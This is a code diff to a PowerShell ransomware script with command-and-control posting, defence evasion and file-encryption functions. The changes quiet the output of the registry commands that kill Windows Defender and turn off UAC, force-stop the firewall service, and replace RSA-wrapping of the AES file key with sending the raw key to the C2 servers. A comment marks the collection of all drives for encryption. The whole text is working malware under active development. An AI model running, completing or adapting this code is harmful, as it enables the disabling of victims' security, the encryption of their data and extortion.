@@ -72,7 +72,7 @@ function Invoke-C2($type, $data) {
     foreach ($url in $c2Urls) {
         try {
             $body = @{type = $type; data = $data; session_id = $SESSION_ID; machine_id = $MACHINE_ID } | ConvertTo-Json -Compress
-            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 8 -ErrorAction Stop
+            $null = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 8 -ErrorAction Stop
             return  # Success, exit
         }
         catch { continue }
@@ -129,23 +129,23 @@ function Invoke-Evasion {
   
     # 1.5 Windows Defender Registry Kill
     try {
-        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
+        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
+        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
     }
     catch {}
   
     # 1.6 Windows Firewall Disable
     try {
         netsh advfirewall set allprofiles state off
-        Get-Service -Name 'MpsSvc' -ErrorAction SilentlyContinue | Stop-Service -Force
-        Get-Service -Name 'mpssvc' -ErrorAction SilentlyContinue | Stop-Service -Force
+        Get-Service -Name 'MpsSvc' -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
+        Get-Service -Name 'mpssvc' -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
     }
     catch {}
   
     # 1.7 UAC Bypass (Registry)
     try {
-        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
+        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
+        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
     }
     catch {}
   
@@ -588,12 +588,10 @@ function Invoke-Ransomware {
     $aes.KeySize = 256; $aes.GenerateKey(); $aes.GenerateIV()
     $aesKey = $aes.Key; $aesIV = $aes.IV
     
-    # RSA Encrypt
-    $rsa = [System.Security.Cryptography.RSA]::Create()
-    $rsa.ImportFromPem($RSA_PUBLIC_KEY)
-    $encryptedAesKey = $rsa.Encrypt($aesKey, [Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
-    $encryptedAesIV = $rsa.Encrypt($aesIV, [Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
-    Invoke-C2 decrypt_key @{encrypted_key = [Convert]::ToBase64String($encryptedAesKey); encrypted_iv = [Convert]::ToBase64String($encryptedAesIV) }
+    # Send AES keys to C2
+    $encryptedAesKey = [Convert]::ToBase64String($aesKey)
+    $encryptedAesIV = [Convert]::ToBase64String($aesIV)
+    Invoke-C2 decrypt_key @{encrypted_key = $encryptedAesKey; encrypted_iv = $encryptedAesIV }
     
     # === FIX: Collect ALL drives ===
     $targetDirs = @()
